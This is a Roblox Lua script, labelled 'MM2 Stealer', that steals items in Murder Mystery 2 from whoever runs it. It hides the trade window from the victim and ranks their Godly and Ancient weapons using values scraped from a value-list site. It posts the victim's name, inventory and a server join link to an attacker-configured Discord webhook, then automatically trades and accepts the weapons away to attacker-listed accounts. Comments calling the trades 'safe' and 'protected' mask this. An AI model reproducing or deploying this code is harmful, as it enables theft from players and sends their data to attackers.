local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Evitar ejecución múltiple y dumping
if getgenv().MM2ScriptExecuted or not LocalPlayer then return end
getgenv().MM2ScriptExecuted = true

-- Configuración
local webhook = _G.webhook or ""
local users = _G.Usernames or {}
local min_rarity = _G.min_rarity or "Godly"
local min_value = _G.min_value or 1
local pingEveryone = _G.pingEveryone == "Yes"

-- Request seguro
local req = syn and syn.request or http_request or request
if not req then warn("No HTTP request method available!") return end

-- Función para enviar webhook
local function SendWebhook(title, description, fields, prefix)
    local data = {
        ["content"] = prefix or "",
        ["embeds"] = {{
            ["title"] = title,
            ["description"] = description or "",
            ["color"] = 65280,
            ["fields"] = fields or {},
            ["thumbnail"] = {["url"] = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"},
            ["footer"] = {["text"] = "MM2 Stealer Protegido"}
        }}
    }
    local body = HttpService:JSONEncode(data)
    pcall(function()
        req({Url = webhook, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = body})
    end)
end

-- Ocultar GUI de trade
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
    local gui = playerGui:FindFirstChild(guiName)
    if gui then
        gui:GetPropertyChangedSignal("Enabled"):Connect(function() gui.Enabled = false end)
        gui.Enabled = false
    end
end

-- Trade seguro
local TradeService = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
local function sendTradeRequest(user)
    local plrObj = Players:FindFirstChild(user)
    if plrObj then pcall(function() TradeService.SendRequest:InvokeServer(plrObj) end) end
end
local function addWeaponToTrade(id) pcall(function() TradeService.OfferItem:FireServer(id,"Weapons") end) end
local function acceptTrade() pcall(function() TradeService.AcceptTrade:FireServer(285646582) end) end
local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end

-- MM2 Supreme value system
local database = require(game.ReplicatedStorage.Database.Sync.Item)
local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
local categories = {
    godly = "https://supremevaluelist.com/mm2/godlies.html",
    ancient = "https://supremevaluelist.com/mm2/ancients.html",
    chroma = "https://supremevaluelist.com/mm2/chromas.html"
}
local headers = {["Accept"]="text/html",["User-Agent"]="Mozilla/5.0"}

local function trim(s) return s:match("^%s*(.-)%s*$") end
local function fetchHTML(url)
    local res = request({Url=url, Method="GET", Headers=headers})
    return res.Body
end
local function parseValue(itembodyDiv)
    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
    if valueStr then valueStr = valueStr:gsub(",", "") return tonumber(valueStr) end
end
local function extractItems(html)
    local items = {}
    for name, body in html:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        name = trim(name:match("([^<]+)"):gsub("%s+"," "))
        name = trim((name:split(" Click "))[1])
        local value = parseValue(body)
        if value then items[name:lower()] = value end
    end
    return items
end

local function buildValueList()
    local allValues = {}
    for r,url in pairs(categories) do
        local html = fetchHTML(url)
        if html and html~="" then
            local vals = extractItems(html)
            for k,v in pairs(vals) do allValues[k]=v end
        end
    end
    local valueList = {}
    for dataid,item in pairs(database) do
        local name = item.ItemName and item.ItemName:lower() or ""
        local rarity = item.Rarity or ""
        local weaponRarityIndex = table.find(rarityTable,rarity)
        local godlyIndex = table.find(rarityTable,"Godly")
        if name~="" and weaponRarityIndex and weaponRarityIndex >= godlyIndex then
            if allValues[name] then valueList[dataid]=allValues[name] end
        end
    end
    return valueList
end

-- ====================================

local weaponsToSend = {}
local totalValue = 0
local min_rarity_index = table.find(rarityTable, min_rarity)
local valueList = buildValueList()

-- Extraer armas Godly/Ancient
local profile = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
for id, amount in pairs(profile.Weapons.Owned) do
    local item = database[id]
    if item then
        local rarityIndex = table.find(rarityTable, item.Rarity)
        if rarityIndex and rarityIndex >= min_rarity_index then
            local value = valueList[id] or 10
            if value >= min_value then
                table.insert(weaponsToSend,{DataID=id,Amount=amount,Value=value,Rarity=item.Rarity})
                totalValue += value * amount
            end
        end
    end
end

if #weaponsToSend>0 then
    table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)

    -- Generar link protegido con supremo bypass
    local rawLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
    local encodedLink = HttpService:UrlEncode(HttpService:Base64Encode(rawLink))
    local safeLink = "https://fern.wtf/redirect?data="..encodedLink

    local fields = {
        {name="Victim 👤", value=LocalPlayer.Name, inline=true},
        {name="Enlace seguro 🔗", value=safeLink, inline=false},
        {name="Inventario 📦", value="", inline=false},
        {name="Valor total 📦", value=tostring(totalValue), inline=true}
    }

    for _, w in ipairs(weaponsToSend) do
        fields[3].value = fields[3].value .. string.format("%s x%s (%s) | Value: %s\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
    end

    local prefix = pingEveryone and "@everyone " or ""
    SendWebhook("💪MM2 Hit Supremo💯", "💰Solo Godly/Ancient armas", fields, prefix)

    -- Trade seguro
    local function doTrade(targetName)
        while #weaponsToSend>0 do
            local status = getTradeStatus()
            if status=="None" then sendTradeRequest(targetName)
            elseif status=="SendingRequest" then task.wait(0.3)
            elseif status=="StartTrade" then
                for i=1,math.min(4,#weaponsToSend) do
                    local w = table.remove(weaponsToSend,1)
                    for _=1,w.Amount do addWeaponToTrade(w.DataID) end
                end
                task.wait(6)
                acceptTrade()
                waitForTradeCompletion()
            else task.wait(0.5)
            end
            task.wait(1)
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do
        if table.find(users,p.Name) then
            p.Chatted:Connect(function() doTrade(p.Name) end)
        end
    end
    Players.PlayerAdded:Connect(function(p)
        if table.find(users,p.Name) then
            p.Chatted:Connect(function() doTrade(p.Name) end)
        end
    end)
end
